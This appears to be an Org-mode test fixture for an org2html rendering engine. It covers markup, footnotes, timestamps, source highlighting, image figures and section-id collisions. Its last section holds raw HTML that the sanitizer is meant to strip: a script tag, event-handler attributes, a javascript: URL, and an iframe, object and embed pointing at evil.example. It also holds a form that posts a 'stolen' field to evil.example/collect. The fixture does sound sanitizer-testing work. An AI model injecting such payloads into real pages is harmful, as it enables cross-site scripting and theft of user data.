One document exercising every construct the engine knows, so a single file
proves the whole surface. The sections named /Images/, /Links/, /Location/,
/Name/ and /Plugins/ are chosen deliberately: their ids collide with ids the
page shell already uses, and the engine must disambiguate them with a
=-section= suffix rather than clobbering its own anchors.

See [[*Images]] and [[*Location]] for the two links that would break first.

* Paragraphs and inline markup

Every inline form in one paragraph: *bold*, /italic/, _underline_,
+strikethrough+, ~inline code~ and =verbatim text=.

A second paragraph, so paragraph separation is exercised rather than assumed.
It also carries a footnote reference[fn:1] and a named one[fn:method].

An inline active timestamp <2026-04-05 Sun> and an inactive one
[2026-04-06 Mon] sit in body text, which is a different construct from the
=#+DATE= keyword in the header.

* Source code

A language that HAS a Shiki grammar, so it must arrive highlighted:

#+BEGIN_SRC javascript
const greet = (name) => `hello ${name}`
export default greet
#+END_SRC

A language that has NO grammar. It must ship unhighlighted /and say so/ —
=org-src--plain= in the markup, and a reason on stderr:

#+BEGIN_SRC emacs-lisp
(message "hi")
#+END_SRC

* Images

A captioned image is a figure. Content images are referenced at their DEPLOYED
path, because org2html does not copy them and =--asset-base= does not rewrite
their URLs:

#+CAPTION: A caption, which is what turns a bare image link into a figure.
[[/blog/media/sample.png]]

A bare image link with no caption, which must NOT become a figure:

[[/blog/media/sample.png]]

* Raw HTML and the sanitizer

SANITIZE BY DEFAULT is the engine's headline law. Everything below is raw HTML
handed straight to the renderer: the hostile constructs must be REMOVED and the
benign ones must SURVIVE.

#+BEGIN_EXPORT html
<p id="benign">Benign markup that must survive:
  <strong>bold</strong>, <em>emphasis</em>, <code>code</code>, and a
  <a href="https://example.com/ok">normal link</a>.</p>

<script>window.__pwned = 1;</script>
<img src="/blog/media/sample.png" onerror="window.__pwned = 2">
<a href="javascript:window.__pwned=3">javascript url</a>
<iframe src="https://evil.example/frame"></iframe>
<style>body { display: none }</style>
<form action="https://evil.example/collect" method="post">
  <input type="text" name="stolen">
</form>
<div onclick="window.__pwned = 4">click handler</div>
<object data="https://evil.example/o"></object>
<embed src="https://evil.example/e">
#+END_EXPORT

An inline export: @@html:<span id="inline-ok">inline export</span>@@ and a
hostile inline one: @@html:<span onmouseover="window.__pwned=5">x</span>@@
